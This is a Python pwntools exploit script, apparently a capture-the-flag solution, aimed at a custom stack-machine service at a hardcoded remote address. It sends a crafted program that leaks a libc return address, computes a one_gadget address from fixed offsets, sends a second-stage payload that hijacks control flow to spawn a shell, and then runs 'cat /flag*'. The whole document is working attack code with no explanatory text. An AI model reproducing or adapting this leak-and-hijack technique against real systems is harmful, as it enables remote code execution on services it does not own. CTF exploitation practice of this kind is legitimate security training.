from pwn import *
import re

context.log_level = 'info'
HOST = '123.57.66.184'
PORT = 10014
LIBC_START_MAIN_RET_OFF = 0x20840
ONE_GADGET_OFF = 0xf1247
DELTA = ONE_GADGET_OFF - LIBC_START_MAIN_RET_OFF

leak_prog = '''vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,646,
switch_stack
print
#
'''


def build_stage2():
    return f'''vec int >>,{DELTA},0,0,
cal add stack_to_reg
adj clear_stack ???
vec int >>,0,0,0,
cal add stack_to_reg
adj clear_stack ???
vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,647,
switch_stack
cal add reg_to_stack
cal stack_move 646
cal add stack
switch_stack
adj clear_stack ???
vec int >>,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,648,
switch_stack
cal stack_move 645
#
'''


def leak_ret():
    io = remote(HOST, PORT)
    io.recvuntil(b'Now,tell me your answer.\n')
    io.send(leak_prog.encode())
    data = io.recvrepeat(2)
    io.close()
    nums = re.findall(rb'(?m)^([0-9]{6,})\s*$', data)
    if not nums:
        raise RuntimeError('failed to leak __libc_start_main_ret')
    return int(nums[0])


def get_flag():
    leak = leak_ret()
    one = leak - LIBC_START_MAIN_RET_OFF + ONE_GADGET_OFF
    log.info(f'leaked __libc_start_main_ret = {hex(leak)}')
    log.info(f'calculated one_gadget      = {hex(one)}')

    io = remote(HOST, PORT)
    io.recvuntil(b'Now,tell me your answer.\n')
    io.send(build_stage2().encode())
    io.send(b'cat /flag*\n')
    out = io.recvrepeat(2)
    io.close()
    print(out.decode('utf-8', 'replace'))


if __name__ == '__main__':
    get_flag()
